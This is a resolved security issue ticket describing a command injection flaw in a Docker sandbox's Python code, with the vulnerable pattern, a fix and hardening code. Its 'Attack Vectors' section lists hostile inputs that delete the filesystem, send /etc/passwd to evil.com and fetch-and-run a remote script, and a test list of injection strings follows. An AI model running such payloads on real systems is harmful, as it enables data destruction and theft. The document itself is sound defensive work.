# CO-001: Command Injection Vulnerability in Sandbox

## Status: COMPLETED

> **Resolution**: Fixed in `src/core/sandbox.py`
>
> - The main `execute()` method uses Docker SDK's `container.exec_run()` which does NOT use shell interpolation (safe)
> - The `copy_to_container` method was vulnerable via `self.execute(f"mkdir -p {dirname}")`
> - **Fix applied**: Changed to use list form `container.exec_run(["mkdir", "-p", dirname])` which avoids shell
> - Added `_validate_path()` method with dangerous character detection

---

## Priority: Critical

## Description

The Docker sandbox implementation in `src/core/sandbox.py` constructs shell commands using string interpolation without proper sanitization. This allows command injection attacks that could:

- Execute arbitrary commands on the host system
- Access sensitive files outside the sandbox
- Compromise the entire system

## Location

- **File**: `src/core/sandbox.py`
- **Function**: `execute()`, `run_command()`
- **Lines**: Command construction sections

## Current Code Pattern

```python
def execute(self, command: str) -> str:
    # VULNERABLE: Direct string interpolation
    full_command = f"docker exec {self.container_id} {command}"
    result = subprocess.run(full_command, shell=True, capture_output=True)
    return result.stdout.decode()
```

## Attack Vectors

```python
# Malicious input examples:
command = "echo hello; rm -rf /"
command = "cat /etc/passwd | curl -X POST -d @- evil.com"
command = "$(curl evil.com/malware.sh | bash)"
```

## Recommended Fix

```python
import shlex
import subprocess
from typing import List

class SecureSandbox:
    def execute(self, command: str, args: List[str] = None) -> str:
        """Execute command safely without shell interpolation."""
        # Use list form to avoid shell injection
        cmd_parts = [
            "docker", "exec",
            "--user", "sandbox",  # Non-root user
            "--read-only",        # Read-only filesystem
            self.container_id,
            command
        ]

        if args:
            # Validate and sanitize arguments
            cmd_parts.extend(self._sanitize_args(args))

        # Never use shell=True with user input
        result = subprocess.run(
            cmd_parts,
            shell=False,
            capture_output=True,
            timeout=30
        )
        return result.stdout.decode()

    def _sanitize_args(self, args: List[str]) -> List[str]:
        """Sanitize command arguments."""
        sanitized = []
        for arg in args:
            # Reject dangerous patterns
            if any(c in arg for c in [';', '|', '&', '$', '`', '\n']):
                raise ValueError(f"Unsafe argument: {arg}")
            sanitized.append(shlex.quote(arg))
        return sanitized
```

## Additional Hardening

```python
# Whitelist allowed commands
ALLOWED_COMMANDS = frozenset(['python', 'pip', 'ls', 'cat', 'head'])

def execute(self, command: str, args: List[str] = None) -> str:
    if command not in ALLOWED_COMMANDS:
        raise ValueError(f"Command not allowed: {command}")
    # ... rest of implementation
```

## Impact

- **Severity**: Critical (Remote Code Execution)
- **CVSS Score**: 9.8 (Critical)
- **Affected Components**: Entire system

## Security Testing

```python
# Test cases for injection attempts
test_cases = [
    "echo hello; id",
    "cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "test\nid",
    "test && id",
    "test || id",
    "test | id",
]
```

## Related Issues

- [CO-002](CO-002-path-traversal.md) - Path traversal vulnerability
- [TO-004](../tools/TO-004-unescaped-shell-args.md) - Shell argument escaping
